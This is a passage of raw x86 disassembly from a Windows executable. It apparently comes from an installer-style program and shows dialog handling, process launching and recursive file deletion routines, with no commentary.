  405276:	4f                   	dec    %edi
  405277:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  40527b:	74 0f                	je     0x40528c
  40527d:	ff 74 24 0c          	push   0xc(%esp)
  405281:	ff 36                	push   (%esi)
  405283:	e8 01 c1 ff ff       	call   0x401389
  405288:	85 c0                	test   %eax,%eax
  40528a:	75 0c                	jne    0x405298
  40528c:	81 c6 18 08 00 00    	add    $0x818,%esi
  405292:	85 ff                	test   %edi,%edi
  405294:	75 e0                	jne    0x405276
  405296:	eb 06                	jmp    0x40529e
  405298:	ff 05 8c 92 42 00    	incl   0x42928c
  40529e:	68 04 04 00 00       	push   $0x404
  4052a3:	e8 82 ee ff ff       	call   0x40412a
  4052a8:	ff 15 a0 72 40 00    	call   *0x4072a0
  4052ae:	a1 8c 92 42 00       	mov    0x42928c,%eax
  4052b3:	5f                   	pop    %edi
  4052b4:	5e                   	pop    %esi
  4052b5:	c2 04 00             	ret    $0x4
  4052b8:	55                   	push   %ebp
  4052b9:	8b ec                	mov    %esp,%ebp
  4052bb:	83 ec 40             	sub    $0x40,%esp
  4052be:	53                   	push   %ebx
  4052bf:	56                   	push   %esi
  4052c0:	8b 35 e4 81 42 00    	mov    0x4281e4,%esi
  4052c6:	33 db                	xor    %ebx,%ebx
  4052c8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4052cf:	57                   	push   %edi
  4052d0:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4052d3:	0f 85 89 01 00 00    	jne    0x405462
  4052d9:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4052dd:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  4052e1:	6a 02                	push   $0x2
  4052e3:	33 c0                	xor    %eax,%eax
  4052e5:	5e                   	pop    %esi
  4052e6:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4052e9:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4052ec:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4052ef:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4052f2:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4052f5:	ab                   	stos   %eax,%es:(%edi)
  4052f6:	ab                   	stos   %eax,%es:(%edi)
  4052f7:	a1 10 92 42 00       	mov    0x429210,%eax
  4052fc:	8b 3d 6c 72 40 00    	mov    0x40726c,%edi
  405302:	68 03 04 00 00       	push   $0x403
  405307:	8b 48 5c             	mov    0x5c(%eax),%ecx
  40530a:	8b 40 60             	mov    0x60(%eax),%eax
  40530d:	ff 75 08             	push   0x8(%ebp)
  405310:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405313:	89 45 10             	mov    %eax,0x10(%ebp)
  405316:	ff d7                	call   *%edi
  405318:	68 ee 03 00 00       	push   $0x3ee
  40531d:	a3 d0 81 42 00       	mov    %eax,0x4281d0
  405322:	ff 75 08             	push   0x8(%ebp)
  405325:	ff d7                	call   *%edi
  405327:	68 f8 03 00 00       	push   $0x3f8
  40532c:	a3 c8 81 42 00       	mov    %eax,0x4281c8
  405331:	ff 75 08             	push   0x8(%ebp)
  405334:	ff d7                	call   *%edi
  405336:	ff 35 d0 81 42 00    	push   0x4281d0
  40533c:	a3 e4 81 42 00       	mov    %eax,0x4281e4
  405341:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405344:	e8 ca ed ff ff       	call   0x404113
  405349:	6a 04                	push   $0x4
  40534b:	e8 c6 f6 ff ff       	call   0x404a16
  405350:	a3 d4 81 42 00       	mov    %eax,0x4281d4
  405355:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405358:	50                   	push   %eax
  405359:	89 1d ec 81 42 00    	mov    %ebx,0x4281ec
  40535f:	ff 75 fc             	push   -0x4(%ebp)
  405362:	ff 15 2c 72 40 00    	call   *0x40722c
  405368:	56                   	push   %esi
  405369:	ff 15 ec 71 40 00    	call   *0x4071ec
  40536f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405372:	8b 35 20 72 40 00    	mov    0x407220,%esi
  405378:	2b c8                	sub    %eax,%ecx
  40537a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40537d:	50                   	push   %eax
  40537e:	53                   	push   %ebx
  40537f:	68 61 10 00 00       	push   $0x1061
  405384:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405387:	ff 75 fc             	push   -0x4(%ebp)
  40538a:	ff d6                	call   *%esi
  40538c:	b8 00 40 00 00       	mov    $0x4000,%eax
  405391:	50                   	push   %eax
  405392:	50                   	push   %eax
  405393:	68 36 10 00 00       	push   $0x1036
  405398:	ff 75 fc             	push   -0x4(%ebp)
  40539b:	ff d6                	call   *%esi
  40539d:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4053a0:	7c 1c                	jl     0x4053be
  4053a2:	ff 75 0c             	push   0xc(%ebp)
  4053a5:	53                   	push   %ebx
  4053a6:	68 01 10 00 00       	push   $0x1001
  4053ab:	ff 75 fc             	push   -0x4(%ebp)
  4053ae:	ff d6                	call   *%esi
  4053b0:	ff 75 0c             	push   0xc(%ebp)
  4053b3:	53                   	push   %ebx
  4053b4:	68 26 10 00 00       	push   $0x1026
  4053b9:	ff 75 fc             	push   -0x4(%ebp)
  4053bc:	ff d6                	call   *%esi
  4053be:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4053c1:	7c 0e                	jl     0x4053d1
  4053c3:	ff 75 10             	push   0x10(%ebp)
  4053c6:	53                   	push   %ebx
  4053c7:	68 24 10 00 00       	push   $0x1024
  4053cc:	ff 75 fc             	push   -0x4(%ebp)
  4053cf:	ff d6                	call   *%esi
  4053d1:	8b 45 14             	mov    0x14(%ebp),%eax
  4053d4:	ff 70 30             	push   0x30(%eax)
  4053d7:	6a 1b                	push   $0x1b
  4053d9:	ff 75 08             	push   0x8(%ebp)
  4053dc:	e8 fd ec ff ff       	call   0x4040de
  4053e1:	f6 05 18 92 42 00 03 	testb  $0x3,0x429218
  4053e8:	74 34                	je     0x40541e
  4053ea:	53                   	push   %ebx
  4053eb:	ff 35 d0 81 42 00    	push   0x4281d0
  4053f1:	ff 15 68 72 40 00    	call   *0x407268
  4053f7:	f6 05 18 92 42 00 02 	testb  $0x2,0x429218
  4053fe:	75 0d                	jne    0x40540d
  405400:	6a 08                	push   $0x8
  405402:	ff 75 fc             	push   -0x4(%ebp)
  405405:	ff 15 68 72 40 00    	call   *0x407268
  40540b:	eb 06                	jmp    0x405413
  40540d:	89 1d d0 81 42 00    	mov    %ebx,0x4281d0
  405413:	ff 35 c8 81 42 00    	push   0x4281c8
  405419:	e8 f5 ec ff ff       	call   0x404113
  40541e:	68 ec 03 00 00       	push   $0x3ec
  405423:	ff 75 08             	push   0x8(%ebp)
  405426:	ff d7                	call   *%edi
  405428:	68 00 00 30 75       	push   $0x75300000
  40542d:	8b f8                	mov    %eax,%edi
  40542f:	53                   	push   %ebx
  405430:	68 01 04 00 00       	push   $0x401
  405435:	57                   	push   %edi
  405436:	ff d6                	call   *%esi
  405438:	f6 05 18 92 42 00 04 	testb  $0x4,0x429218
  40543f:	0f 84 fc 01 00 00    	je     0x405641
  405445:	ff 75 10             	push   0x10(%ebp)
  405448:	53                   	push   %ebx
  405449:	68 09 04 00 00       	push   $0x409
  40544e:	57                   	push   %edi
  40544f:	ff d6                	call   *%esi
  405451:	ff 75 0c             	push   0xc(%ebp)
  405454:	53                   	push   %ebx
  405455:	68 01 20 00 00       	push   $0x2001
  40545a:	57                   	push   %edi
  40545b:	ff d6                	call   *%esi
  40545d:	e9 df 01 00 00       	jmp    0x405641
  405462:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405469:	75 28                	jne    0x405493
  40546b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40546e:	50                   	push   %eax
  40546f:	53                   	push   %ebx
  405470:	68 ec 03 00 00       	push   $0x3ec
  405475:	ff 75 08             	push   0x8(%ebp)
  405478:	ff 15 6c 72 40 00    	call   *0x40726c
  40547e:	50                   	push   %eax
  40547f:	68 4c 52 40 00       	push   $0x40524c
  405484:	53                   	push   %ebx
  405485:	53                   	push   %ebx
  405486:	ff 15 c8 70 40 00    	call   *0x4070c8
  40548c:	50                   	push   %eax
  40548d:	ff 15 20 71 40 00    	call   *0x407120
  405493:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40549a:	8b 3d 68 72 40 00    	mov    0x407268,%edi
  4054a0:	75 1c                	jne    0x4054be
  4054a2:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  4054a8:	75 39                	jne    0x4054e3
  4054aa:	53                   	push   %ebx
  4054ab:	ff 35 d0 81 42 00    	push   0x4281d0
  4054b1:	ff d7                	call   *%edi
  4054b3:	6a 08                	push   $0x8
  4054b5:	56                   	push   %esi
  4054b6:	ff d7                	call   *%edi
  4054b8:	56                   	push   %esi
  4054b9:	e8 55 ec ff ff       	call   0x404113
  4054be:	33 f6                	xor    %esi,%esi
  4054c0:	46                   	inc    %esi
  4054c1:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  4054c8:	75 54                	jne    0x40551e
  4054ca:	39 1d cc 81 42 00    	cmp    %ebx,0x4281cc
  4054d0:	74 26                	je     0x4054f8
  4054d2:	6a 78                	push   $0x78
  4054d4:	c7 05 b8 0e 42 00 02 	movl   $0x2,0x420eb8
  4054db:	00 00 00 
  4054de:	e8 d4 eb ff ff       	call   0x4040b7
  4054e3:	ff 75 14             	push   0x14(%ebp)
  4054e6:	ff 75 10             	push   0x10(%ebp)
  4054e9:	ff 75 0c             	push   0xc(%ebp)
  4054ec:	e8 54 ec ff ff       	call   0x404145
  4054f1:	5f                   	pop    %edi
  4054f2:	5e                   	pop    %esi
  4054f3:	5b                   	pop    %ebx
  4054f4:	c9                   	leave
  4054f5:	c2 10 00             	ret    $0x10
  4054f8:	6a 08                	push   $0x8
  4054fa:	ff 35 08 92 42 00    	push   0x429208
  405500:	ff d7                	call   *%edi
  405502:	39 1d 8c 92 42 00    	cmp    %ebx,0x42928c
  405508:	75 0e                	jne    0x405518
  40550a:	a1 c0 16 42 00       	mov    0x4216c0,%eax
  40550f:	53                   	push   %ebx
  405510:	ff 70 34             	push   0x34(%eax)
  405513:	e8 61 fc ff ff       	call   0x405179
  405518:	56                   	push   %esi
  405519:	e8 99 eb ff ff       	call   0x4040b7
  40551e:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  405522:	75 bf                	jne    0x4054e3
  405524:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405527:	39 45 10             	cmp    %eax,0x10(%ebp)
  40552a:	75 b7                	jne    0x4054e3
  40552c:	53                   	push   %ebx
  40552d:	53                   	push   %ebx
  40552e:	68 04 10 00 00       	push   $0x1004
  405533:	50                   	push   %eax
  405534:	ff 15 20 72 40 00    	call   *0x407220
  40553a:	3b c3                	cmp    %ebx,%eax
  40553c:	89 45 0c             	mov    %eax,0xc(%ebp)
  40553f:	0f 8e fc 00 00 00    	jle    0x405641
  405545:	ff 15 84 72 40 00    	call   *0x407284
  40554b:	6a e1                	push   $0xffffffe1
  40554d:	53                   	push   %ebx
  40554e:	8b f8                	mov    %eax,%edi
  405550:	e8 e7 0a 00 00       	call   0x40603c
  405555:	50                   	push   %eax
  405556:	56                   	push   %esi
  405557:	53                   	push   %ebx
  405558:	57                   	push   %edi
  405559:	ff 15 80 72 40 00    	call   *0x407280
  40555f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405562:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405566:	c1 e9 10             	shr    $0x10,%ecx
  405569:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  40556d:	0f bf c9             	movswl %cx,%ecx
  405570:	75 13                	jne    0x405585
  405572:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405575:	50                   	push   %eax
  405576:	ff 75 fc             	push   -0x4(%ebp)
  405579:	ff 15 e8 71 40 00    	call   *0x4071e8
  40557f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405582:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405585:	53                   	push   %ebx
  405586:	ff 75 08             	push   0x8(%ebp)
  405589:	53                   	push   %ebx
  40558a:	51                   	push   %ecx
  40558b:	50                   	push   %eax
  40558c:	68 80 01 00 00       	push   $0x180
  405591:	57                   	push   %edi
  405592:	ff 15 7c 72 40 00    	call   *0x40727c
  405598:	3b c6                	cmp    %esi,%eax
  40559a:	0f 85 a1 00 00 00    	jne    0x405641
  4055a0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4055a3:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4055a6:	c7 45 d4 e8 26 42 00 	movl   $0x4226e8,-0x2c(%ebp)
  4055ad:	c7 45 d8 ff 1f 00 00 	movl   $0x1fff,-0x28(%ebp)
  4055b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4055b7:	bf 73 10 00 00       	mov    $0x1073,%edi
  4055bc:	ff 4d 08             	decl   0x8(%ebp)
  4055bf:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4055c2:	50                   	push   %eax
  4055c3:	ff 75 08             	push   0x8(%ebp)
  4055c6:	57                   	push   %edi
  4055c7:	ff 75 fc             	push   -0x4(%ebp)
  4055ca:	ff 15 20 72 40 00    	call   *0x407220
  4055d0:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4055d3:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4055d7:	75 e3                	jne    0x4055bc
  4055d9:	53                   	push   %ebx
  4055da:	ff 15 dc 71 40 00    	call   *0x4071dc
  4055e0:	ff 15 d8 71 40 00    	call   *0x4071d8
  4055e6:	8d 04 36             	lea    (%esi,%esi,1),%eax
  4055e9:	50                   	push   %eax
  4055ea:	6a 42                	push   $0x42
  4055ec:	ff 15 0c 71 40 00    	call   *0x40710c
  4055f2:	50                   	push   %eax
  4055f3:	89 45 08             	mov    %eax,0x8(%ebp)
  4055f6:	ff 15 c4 70 40 00    	call   *0x4070c4
  4055fc:	8b f0                	mov    %eax,%esi
  4055fe:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405601:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405604:	50                   	push   %eax
  405605:	53                   	push   %ebx
  405606:	57                   	push   %edi
  405607:	ff 75 fc             	push   -0x4(%ebp)
  40560a:	ff 15 20 72 40 00    	call   *0x407220
  405610:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405613:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405618:	46                   	inc    %esi
  405619:	46                   	inc    %esi
  40561a:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  40561f:	46                   	inc    %esi
  405620:	46                   	inc    %esi
  405621:	43                   	inc    %ebx
  405622:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405625:	7c d7                	jl     0x4055fe
  405627:	ff 75 08             	push   0x8(%ebp)
  40562a:	ff 15 2c 71 40 00    	call   *0x40712c
  405630:	ff 75 08             	push   0x8(%ebp)
  405633:	6a 0d                	push   $0xd
  405635:	ff 15 d4 71 40 00    	call   *0x4071d4
  40563b:	ff 15 d0 71 40 00    	call   *0x4071d0
  405641:	33 c0                	xor    %eax,%eax
  405643:	e9 a9 fe ff ff       	jmp    0x4054f1
  405648:	55                   	push   %ebp
  405649:	8b ec                	mov    %esp,%ebp
  40564b:	83 ec 20             	sub    $0x20,%esp
  40564e:	b8 f8 73 40 00       	mov    $0x4073f8,%eax
  405653:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405657:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40565a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40565d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405660:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405664:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405668:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40566b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40566e:	56                   	push   %esi
  40566f:	50                   	push   %eax
  405670:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405674:	ff 75 08             	push   0x8(%ebp)
  405677:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  40567d:	c7 45 f0 e8 73 40 00 	movl   $0x4073e8,-0x10(%ebp)
  405684:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  40568b:	ff 15 d0 70 40 00    	call   *0x4070d0
  405691:	85 c0                	test   %eax,%eax
  405693:	74 04                	je     0x405699
  405695:	33 c0                	xor    %eax,%eax
  405697:	eb 27                	jmp    0x4056c0
  405699:	8b 35 cc 70 40 00    	mov    0x4070cc,%esi
  40569f:	ff d6                	call   *%esi
  4056a1:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4056a6:	75 18                	jne    0x4056c0
  4056a8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4056ab:	50                   	push   %eax
  4056ac:	68 07 00 00 80       	push   $0x80000007
  4056b1:	ff 75 08             	push   0x8(%ebp)
  4056b4:	ff 15 04 70 40 00    	call   *0x407004
  4056ba:	85 c0                	test   %eax,%eax
  4056bc:	75 d7                	jne    0x405695
  4056be:	ff d6                	call   *%esi
  4056c0:	5e                   	pop    %esi
  4056c1:	c9                   	leave
  4056c2:	c2 04 00             	ret    $0x4
  4056c5:	6a 00                	push   $0x0
  4056c7:	ff 74 24 08          	push   0x8(%esp)
  4056cb:	ff 15 d0 70 40 00    	call   *0x4070d0
  4056d1:	85 c0                	test   %eax,%eax
  4056d3:	74 04                	je     0x4056d9
  4056d5:	33 c0                	xor    %eax,%eax
  4056d7:	eb 06                	jmp    0x4056df
  4056d9:	ff 15 cc 70 40 00    	call   *0x4070cc
  4056df:	c2 04 00             	ret    $0x4
  4056e2:	6a 05                	push   $0x5
  4056e4:	e8 0b 0d 00 00       	call   0x4063f4
  4056e9:	85 c0                	test   %eax,%eax
  4056eb:	74 0a                	je     0x4056f7
  4056ed:	ff d0                	call   *%eax
  4056ef:	85 c0                	test   %eax,%eax
  4056f1:	74 04                	je     0x4056f7
  4056f3:	33 c0                	xor    %eax,%eax
  4056f5:	40                   	inc    %eax
  4056f6:	c3                   	ret
  4056f7:	33 c0                	xor    %eax,%eax
  4056f9:	c3                   	ret
  4056fa:	55                   	push   %ebp
  4056fb:	8b ec                	mov    %esp,%ebp
  4056fd:	83 ec 10             	sub    $0x10,%esp
  405700:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405703:	c7 05 f0 56 42 00 44 	movl   $0x44,0x4256f0
  40570a:	00 00 00 
  40570d:	50                   	push   %eax
  40570e:	33 c0                	xor    %eax,%eax
  405710:	68 f0 56 42 00       	push   $0x4256f0
  405715:	50                   	push   %eax
  405716:	50                   	push   %eax
  405717:	68 00 00 00 04       	push   $0x4000000
  40571c:	50                   	push   %eax
  40571d:	50                   	push   %eax
  40571e:	50                   	push   %eax
  40571f:	ff 75 08             	push   0x8(%ebp)
  405722:	50                   	push   %eax
  405723:	ff 15 d4 70 40 00    	call   *0x4070d4
  405729:	85 c0                	test   %eax,%eax
  40572b:	74 0c                	je     0x405739
  40572d:	ff 75 f4             	push   -0xc(%ebp)
  405730:	ff 15 20 71 40 00    	call   *0x407120
  405736:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405739:	c9                   	leave
  40573a:	c2 04 00             	ret    $0x4
  40573d:	ff 25 f0 71 40 00    	jmp    *0x4071f0
  405743:	68 00 04 00 00       	push   $0x400
  405748:	ff 74 24 0c          	push   0xc(%esp)
  40574c:	ff 74 24 0c          	push   0xc(%esp)
  405750:	ff 35 d8 81 42 00    	push   0x4281d8
  405756:	ff 15 f4 71 40 00    	call   *0x4071f4
  40575c:	c2 08 00             	ret    $0x8
  40575f:	8b 44 24 08          	mov    0x8(%esp),%eax
  405763:	8b c8                	mov    %eax,%ecx
  405765:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  40576b:	83 3d a0 92 42 00 00 	cmpl   $0x0,0x4292a0
  405772:	74 05                	je     0x405779
  405774:	c1 e8 15             	shr    $0x15,%eax
  405777:	75 47                	jne    0x4057c0
  405779:	83 3d a8 92 42 00 00 	cmpl   $0x0,0x4292a8
  405780:	74 06                	je     0x405788
  405782:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405788:	a1 08 92 42 00       	mov    0x429208,%eax
  40578d:	68 b8 93 40 00       	push   $0x4093b8
  405792:	a3 bc 93 40 00       	mov    %eax,0x4093bc
  405797:	a1 00 92 42 00       	mov    0x429200,%eax
  40579c:	a3 c0 93 40 00       	mov    %eax,0x4093c0
  4057a1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4057a5:	a3 c4 93 40 00       	mov    %eax,0x4093c4
  4057aa:	c7 05 c8 93 40 00 00 	movl   $0x428200,0x4093c8
  4057b1:	82 42 00 
  4057b4:	89 0d cc 93 40 00    	mov    %ecx,0x4093cc
  4057ba:	ff 15 f8 71 40 00    	call   *0x4071f8
  4057c0:	c2 08 00             	ret    $0x8
  4057c3:	56                   	push   %esi
  4057c4:	8b 74 24 08          	mov    0x8(%esp),%esi
  4057c8:	57                   	push   %edi
  4057c9:	56                   	push   %esi
  4057ca:	e8 fb 03 00 00       	call   0x405bca
  4057cf:	8b f8                	mov    %eax,%edi
  4057d1:	83 ff ff             	cmp    $0xffffffff,%edi
  4057d4:	74 2e                	je     0x405804
  4057d6:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  4057db:	56                   	push   %esi
  4057dc:	74 08                	je     0x4057e6
  4057de:	ff 15 d8 70 40 00    	call   *0x4070d8
  4057e4:	eb 06                	jmp    0x4057ec
  4057e6:	ff 15 44 71 40 00    	call   *0x407144
  4057ec:	85 c0                	test   %eax,%eax
  4057ee:	74 05                	je     0x4057f5
  4057f0:	33 c0                	xor    %eax,%eax
  4057f2:	40                   	inc    %eax
  4057f3:	eb 11                	jmp    0x405806
  4057f5:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4057fa:	75 08                	jne    0x405804
  4057fc:	57                   	push   %edi
  4057fd:	56                   	push   %esi
  4057fe:	ff 15 90 70 40 00    	call   *0x407090
  405804:	33 c0                	xor    %eax,%eax
  405806:	5f                   	pop    %edi
  405807:	5e                   	pop    %esi
  405808:	c2 08 00             	ret    $0x8
  40580b:	55                   	push   %ebp
  40580c:	8b ec                	mov    %esp,%ebp
  40580e:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405814:	53                   	push   %ebx
  405815:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405818:	56                   	push   %esi
  405819:	57                   	push   %edi
  40581a:	8b 7d 08             	mov    0x8(%ebp),%edi
  40581d:	8b c3                	mov    %ebx,%eax
  40581f:	83 e0 04             	and    $0x4,%eax
  405822:	57                   	push   %edi
  405823:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405826:	e8 ab 02 00 00       	call   0x405ad6
  40582b:	f6 c3 08             	test   $0x8,%bl
  40582e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405831:	74 17                	je     0x40584a
  405833:	57                   	push   %edi
  405834:	ff 15 44 71 40 00    	call   *0x407144
  40583a:	f7 d8                	neg    %eax
  40583c:	1b c0                	sbb    %eax,%eax
  40583e:	40                   	inc    %eax
  40583f:	01 05 88 92 42 00    	add    %eax,0x429288
  405845:	e9 7d 01 00 00       	jmp    0x4059c7
  40584a:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40584d:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405851:	74 11                	je     0x405864
  405853:	85 c0                	test   %eax,%eax
  405855:	0f 84 1a 01 00 00    	je     0x405975
  40585b:	f6 c3 02             	test   $0x2,%bl
  40585e:	0f 84 11 01 00 00    	je     0x405975
  405864:	be f0 46 42 00       	mov    $0x4246f0,%esi
  405869:	57                   	push   %edi
  40586a:	56                   	push   %esi
  40586b:	e8 aa 07 00 00       	call   0x40601a
  405870:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405874:	74 0d                	je     0x405883
  405876:	68 44 95 40 00       	push   $0x409544
  40587b:	56                   	push   %esi
  40587c:	e8 b5 07 00 00       	call   0x406036
  405881:	eb 06                	jmp    0x405889
  405883:	57                   	push   %edi
  405884:	e8 91 01 00 00       	call   0x405a1a
  405889:	66 83 3f 00          	cmpw   $0x0,(%edi)
  40588d:	75 0a                	jne    0x405899
  40588f:	66 83 3d f0 46 42 00 	cmpw   $0x5c,0x4246f0
  405896:	5c 
  405897:	75 0b                	jne    0x4058a4
  405899:	68 14 90 40 00       	push   $0x409014
  40589e:	57                   	push   %edi
  40589f:	e8 92 07 00 00       	call   0x406036
  4058a4:	57                   	push   %edi
  4058a5:	e8 86 07 00 00       	call   0x406030
  4058aa:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  4058ad:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  4058b3:	50                   	push   %eax
  4058b4:	56                   	push   %esi
  4058b5:	ff 15 3c 71 40 00    	call   *0x40713c
  4058bb:	8b f0                	mov    %eax,%esi
  4058bd:	83 fe ff             	cmp    $0xffffffff,%esi
  4058c0:	0f 84 a4 00 00 00    	je     0x40596a
  4058c6:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  4058cd:	2e 
  4058ce:	75 1e                	jne    0x4058ee
  4058d0:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  4058d7:	00 
  4058d8:	74 73                	je     0x40594d
  4058da:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  4058e1:	2e 
  4058e2:	75 0a                	jne    0x4058ee
  4058e4:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  4058eb:	00 
  4058ec:	74 5f                	je     0x40594d
  4058ee:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4058f4:	50                   	push   %eax
  4058f5:	53                   	push   %ebx
  4058f6:	e8 1f 07 00 00       	call   0x40601a
  4058fb:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405902:	74 15                	je     0x405919
  405904:	8b 45 0c             	mov    0xc(%ebp),%eax
  405907:	83 e0 03             	and    $0x3,%eax
  40590a:	3c 03                	cmp    $0x3,%al
  40590c:	75 3f                	jne    0x40594d
  40590e:	ff 75 0c             	push   0xc(%ebp)
  405911:	57                   	push   %edi
  405912:	e8 f4 fe ff ff       	call   0x40580b
  405917:	eb 34                	jmp    0x40594d
  405919:	ff 75 fc             	push   -0x4(%ebp)
  40591c:	57                   	push   %edi
  40591d:	e8 a1 fe ff ff       	call   0x4057c3
  405922:	85 c0                	test   %eax,%eax
  405924:	75 1f                	jne    0x405945
  405926:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405929:	74 12                	je     0x40593d
  40592b:	57                   	push   %edi
  40592c:	6a f1                	push   $0xfffffff1
  40592e:	e8 46 f8 ff ff       	call   0x405179
  405933:	6a 00                	push   $0x0
  405935:	57                   	push   %edi
  405936:	e8 80 05 00 00       	call   0x405ebb
  40593b:	eb 10                	jmp    0x40594d
  40593d:	ff 05 88 92 42 00    	incl   0x429288
  405943:	eb 08                	jmp    0x40594d
  405945:	57                   	push   %edi
  405946:	6a f2                	push   $0xfffffff2
  405948:	e8 2c f8 ff ff       	call   0x405179
  40594d:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405953:	50                   	push   %eax
  405954:	56                   	push   %esi
  405955:	ff 15 40 71 40 00    	call   *0x407140
  40595b:	85 c0                	test   %eax,%eax
  40595d:	0f 85 63 ff ff ff    	jne    0x4058c6
  405963:	56                   	push   %esi
  405964:	ff 15 50 71 40 00    	call   *0x407150
  40596a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40596e:	74 05                	je     0x405975
  405970:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405975:	33 f6                	xor    %esi,%esi
  405977:	39 75 08             	cmp    %esi,0x8(%ebp)
  40597a:	74 4b                	je     0x4059c7
  40597c:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  40597f:	75 08                	jne    0x405989
  405981:	ff 05 88 92 42 00    	incl   0x429288
  405987:	eb 3e                	jmp    0x4059c7
  405989:	57                   	push   %edi
  40598a:	e8 ce 09 00 00       	call   0x40635d
  40598f:	85 c0                	test   %eax,%eax
  405991:	74 34                	je     0x4059c7
  405993:	57                   	push   %edi
  405994:	e8 35 00 00 00       	call   0x4059ce
  405999:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40599c:	0c 01                	or     $0x1,%al
  40599e:	50                   	push   %eax
  40599f:	57                   	push   %edi
  4059a0:	e8 1e fe ff ff       	call   0x4057c3
  4059a5:	85 c0                	test   %eax,%eax
  4059a7:	75 16                	jne    0x4059bf
  4059a9:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4059ac:	74 d3                	je     0x405981
  4059ae:	57                   	push   %edi
  4059af:	6a f1                	push   $0xfffffff1
  4059b1:	e8 c3 f7 ff ff       	call   0x405179
  4059b6:	56                   	push   %esi
  4059b7:	57                   	push   %edi
  4059b8:	e8 fe 04 00 00       	call   0x405ebb
  4059bd:	eb 08                	jmp    0x4059c7
  4059bf:	57                   	push   %edi
  4059c0:	6a e5                	push   $0xffffffe5
  4059c2:	e8 b2 f7 ff ff       	call   0x405179
  4059c7:	5f                   	pop    %edi
  4059c8:	5e                   	pop    %esi
  4059c9:	5b                   	pop    %ebx
  4059ca:	c9                   	leave
  4059cb:	c2 08 00             	ret    $0x8
  4059ce:	56                   	push   %esi
  4059cf:	8b 74 24 08          	mov    0x8(%esp),%esi
